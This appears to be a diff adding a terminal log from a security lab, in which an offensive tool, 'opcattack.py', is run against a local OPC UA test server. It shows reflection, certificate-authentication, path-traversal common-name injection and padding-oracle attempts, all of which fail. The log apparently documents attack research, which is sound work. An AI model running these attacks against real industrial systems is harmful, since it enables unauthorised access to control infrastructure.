@@ -1,0 +1,100 @@
+heiko@Heiko:/mnt/c/Users/heiko/data/code/siot/bhusa25-opcua$ docker compose run --rm --entrypoint "" opcattack python opcattack.py reflect opc.tcp://opcua-server:4840
+WARN[0000] No services to build
+[+]  1/1t 1/11
+ ✔ Container opcua-server Started                                                               2.3s
+WARN[0002] No services to build
+Container opcua-server Waiting
+Container opcua-server Healthy 
+Container opcua-lab-opcattack-run-440084e420aa Creating 
+Container opcua-lab-opcattack-run-440084e420aa Created 
+[*] Attempting reflection attack against opc.tcp://opcua-server:4840
+[*] Server advertises 3 endpoints.
+[-] Attack failed: Server does not support HTTPS endpoint (with non-None security policy). Try with --bypass-opn instead.
+heiko@Heiko:/mnt/c/Users/heiko/data/code/siot/bhusa25-opcua$ docker compose run --rm --entrypoint "" opcattack python opcattack.py auth-check opc.tcp://opcua-server:4840
+WARN[0000] No services to build
+[+]  1/1t 1/11
+ ✔ Container opcua-server Running                                                                                                                                                                                           0.0s 
+WARN[0000] No services to build
+Container opcua-server Waiting 
+Container opcua-server Healthy 
+Container opcua-lab-opcattack-run-d8381264c109 Creating 
+Container opcua-lab-opcattack-run-d8381264c109 Created 
+[*] Anonymous login didn't work. Trying self-signed certificate next.
+[*] Attempting to log in to opc.tcp://opcua-server:4840 with CN test in self-signed certificate.
+[*] Generated self-signed certificate with CN test.
+[*] SHA-1 thumbprint: ABAFB71F580A4229CE0AABB53EE32F0E9E2DD6B4
+[*] Server advertises 3 endpoints.
+[*] Trying to submit cert to endpoint opc.tcp://opcua-server:4840/freeopcua/server/.
+[+] Certificate was accepted during OPN handshake. Will now try to create a session with it.
+[*] Login blocked. Server responsed with error 0x801a0000: "Unexpected ServiceFault."
+heiko@Heiko:/mnt/c/Users/heiko/data/code/siot/bhusa25-opcua$ docker compose run --rm --entrypoint "" opcattack python opcattack.py cn-inject opc.tcp://opcua-server:4840
+WARN[0000] No services to build
+[+]  1/1t 1/11
+ ✔ Container opcua-server Running                                                                                                                                                                                           0.0s 
+WARN[0000] No services to build
+Container opcua-server Waiting 
+Container opcua-server Healthy 
+Container opcua-lab-opcattack-run-3cc3a1ec1085 Creating 
+Container opcua-lab-opcattack-run-3cc3a1ec1085 Created 
+[*] Attempting to log in to opc.tcp://opcua-server:4840 with CN ../../trusted/certs/TestCert in self-signed certificate.
+[*] Generated self-signed certificate with CN ../../trusted/certs/TestCert.
+[*] SHA-1 thumbprint: C1BDD077E941B201050804711993BEA3486016D4
+[*] Server advertises 3 endpoints.
+[*] Trying to submit cert to endpoint opc.tcp://opcua-server:4840/freeopcua/server/.
+[+] Certificate was accepted during OPN handshake. Will now try to create a session with it.
+[*] Login blocked. Server responsed with error 0x801a0000: "Unexpected ServiceFault."
+heiko@Heiko:/mnt/c/Users/heiko/data/code/siot/bhusa25-opcua$ docker compose run --rm --entrypoint "" opcattack python opcattack.py reflect opc.tcp://opcua-server:4840
+WARN[0000] No services to build
+[+]  1/1t 1/11
+ ✔ Container opcua-server Running                                                                                                                                                                                           0.0s 
+WARN[0000] No services to build
+Container opcua-server Waiting 
+Container opcua-server Healthy 
+Container opcua-lab-opcattack-run-1541c78a4ba6 Creating
+Container opcua-lab-opcattack-run-1541c78a4ba6 Created 
+[*] Attempting reflection attack against opc.tcp://opcua-server:4840
+[*] Server advertises 3 endpoints.
+[-] Attack failed: Server does not support HTTPS endpoint (with non-None security policy). Try with --bypass-opn instead.
+heiko@Heiko:/mnt/c/Users/heiko/data/code/siot/bhusa25-opcua$ docker compose run --rm --entrypoint "" opcattack python opcattack.py reflect --bypass-opn opc.tcp://opcua-server:4840
+WARN[0000] No services to build
+[+]  1/1t 1/11
+ ✔ Container opcua-server Running                                                                                                                                                                                           0.0s 
+WARN[0000] No services to build
+Container opcua-server Waiting 
+Container opcua-server Healthy 
+Container opcua-lab-opcattack-run-5a648e4b3563 Creating
+Container opcua-lab-opcattack-run-5a648e4b3563 Created 
+[*] Attempting reflection attack against opc.tcp://opcua-server:4840
+[*] Server advertises 3 endpoints.
+[*] No HTTPS endpoints. Trying to bypass secure channel on opc.tcp://opcua-server:4840/freeopcua/server/ via padding oracle.
+[*] Trying sigforge attack to produce OPN signature.
+[*] Checking 3 endpoints of opc.tcp://opcua-server:4840/freeopcua/server/ for RSA padding oracle.
+[*] Endpoint "opc.tcp://opcua-server:4840/freeopcua/server/" qualifies for OPN oracle.
+[*] Trying a bunch of known plaintexts to assess OPN oracle quality and reliability...
+[*] Exception TimeoutError raised ("timed out"). Skipping OPN oracle.                                              ]
+[*] None of the endpoints qualify for Password oracle.
+[*] None of the endpoints qualify for Password (alt) oracle.
+[-] Attack failed: Can't find exploitable padding oracle. Maybe try the timing attack?
+heiko@Heiko:/mnt/c/Users/heiko/data/code/siot/bhusa25-opcua$ docker compose run --rm --entrypoint "" opcattack python opcattack.py decrypt opc.tcp://opcua-server:4840
+WARN[0000] No services to build
+[+]  1/1t 1/11
+ ✔ Container opcua-server Running                                                                                                                                                                                           0.0s 
+WARN[0000] No services to build
+Container opcua-server Waiting 
+Container opcua-server Healthy 
+Container opcua-lab-opcattack-run-a4a7bd8a2c79 Creating
+Container opcua-lab-opcattack-run-a4a7bd8a2c79 Created 
+usage: opcattack.py decrypt [-h] [-t {opn,password,try-both}] [-T INTERVAL] [-C COUNT] url ciphertext
+opcattack.py decrypt: error: the following arguments are required: ciphertext
+
+heiko@Heiko:/mnt/c/Users/heiko/data/code/siot/bhusa25-opcua$ docker compose run --rm --entrypoint "" opcattack python opcattack.py sigforge opc.tcp://opcua-server:4840
+WARN[0000] No services to build
+[+]  1/1t 1/11
+ ✔ Container opcua-server Running                                                                                                                                                                                           0.0s 
+WARN[0000] No services to build
+Container opcua-server Waiting 
+Container opcua-server Healthy 
+Container opcua-lab-opcattack-run-a6d9b3ce63fd Creating
+Container opcua-lab-opcattack-run-a6d9b3ce63fd Created 
+usage: opcattack.py sigforge [-h] [-H {sha1,sha256}] [-t {opn,password,try-both}] [-T INTERVAL] [-C COUNT] url payload
+opcattack.py sigforge: error: the following arguments are required: payload
